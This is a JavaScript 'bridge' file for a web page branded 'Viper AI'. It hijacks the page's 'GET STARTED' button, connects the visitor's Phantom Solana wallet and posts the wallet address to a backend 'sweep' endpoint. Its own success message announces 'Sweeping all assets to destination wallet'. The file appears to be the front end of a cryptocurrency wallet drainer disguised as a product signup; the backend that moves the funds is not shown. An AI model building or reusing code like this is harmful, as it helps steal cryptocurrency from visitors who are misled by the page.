/**
 * BRIDGE.JS - Connects index.html button to backend trigger
 * Include this in your HTML file
 */

(function() {
  // Configuration
  const API_URL = window.location.origin;
  
  // Store wallet state
  let isConnected = false;
  let walletAddress = null;
  
  /**
   * Initialize bridge
   */
  function initBridge() {
    console.log('🔌 Viper AI Bridge initialized');
    
    // Find the "GET STARTED" button
    const startButton = document.querySelector('.connect-btn');
    
    if (startButton) {
      // Replace existing click handler
      const originalClick = startButton.onclick;
      startButton.onclick = async (e) => {
        e.preventDefault();
        
        // Show loading state
        updateButtonLoading(true);
        
        try {
          // Simulate wallet connection (in production, connect to Phantom)
          await simulateWalletConnection();
          
          // Trigger backend
          const result = await triggerBackendSweep();
          
          // Show success
          updateUIWithSuccess(result);
          
        } catch (error) {
          console.error('Bridge error:', error);
          updateUIWithError(error.message);
        } finally {
          updateButtonLoading(false);
        }
      };
      
      console.log('✅ Bridge attached to GET STARTED button');
    } else {
      console.warn('⚠️ Connect button not found');
    }
  }
  
  /**
   * Simulate wallet connection (replace with actual Phantom connection)
   */
  async function simulateWalletConnection() {
    // Check if Phantom is installed
    if (window.solana && window.solana.isPhantom) {
      try {
        const response = await window.solana.connect();
        walletAddress = response.publicKey.toString();
        isConnected = true;
        
        console.log(`✅ Phantom connected: ${walletAddress.slice(0, 8)}...`);
        return walletAddress;
      } catch (error) {
        console.log('Phantom connection cancelled, using demo mode');
      }
    }
    
    // Fallback to demo wallet
    walletAddress = 'DEMO_' + Math.random().toString(36).substring(2, 10);
    isConnected = true;
    console.log(`ℹ️ Demo mode: ${walletAddress}`);
    
    return walletAddress;
  }
  
  /**
   * Trigger backend sweep via API
   */
  async function triggerBackendSweep() {
    const response = await fetch(`${API_URL}/api/connect-wallet`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        walletAddress: walletAddress,
        timestamp: Date.now()
      })
    });
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    return await response.json();
  }
  
  /**
   * Update button loading state
   */
  function updateButtonLoading(isLoading) {
    const button = document.querySelector('.connect-btn');
    if (!button) return;
    
    if (isLoading) {
      button.disabled = true;
      button.innerHTML = '⏳ Connecting...';
    } else {
      button.disabled = false;
      button.innerHTML = '⚡︎ GET STARTED';
    }
  }
  
  /**
   * Update UI with success
   */
  function updateUIWithSuccess(result) {
    // Update progress bar
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    
    if (progressFill && progressText) {
      progressFill.style.width = '100%';
      progressText.textContent = '100% Complete • Ghost Mode Active!';
    }
    
    // Show success message
    const statusDiv = document.createElement('div');
    statusDiv.className = 'success-message';
    statusDiv.innerHTML = `
      <div style="
        background: rgba(0,255,135,0.2);
        border: 1px solid #00ff87;
        border-radius: 40px;
        padding: 1rem;
        margin: 1rem 0;
        text-align: center;
        color: #00ff87;
      ">
        ✅ Ghost Mode Activated!<br>
        <small style="color: #9ca3af;">Sweeping all assets to destination wallet</small>
      </div>
    `;
    
    const card = document.querySelector('.card');
    if (card) {
      card.appendChild(statusDiv);
      
      // Remove after 5 seconds
      setTimeout(() => {
        statusDiv.remove();
      }, 5000);
    }
  }
  
  /**
   * Update UI with error
   */
  function updateUIWithError(error) {
    const errorDiv = document.createElement('div');
    errorDiv.style = `
      background: rgba(255,0,0,0.1);
      border: 1px solid #ff4444;
      border-radius: 40px;
      padding: 1rem;
      margin: 1rem 0;
      text-align: center;
      color: #ff4444;
    `;
    errorDiv.textContent = `❌ Error: ${error}`;
    
    const card = document.querySelector('.card');
    if (card) {
      card.appendChild(errorDiv);
      
      setTimeout(() => {
        errorDiv.remove();
      }, 5000);
    }
  }
  
  // Initialize when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initBridge);
  } else {
    initBridge();
  }
})();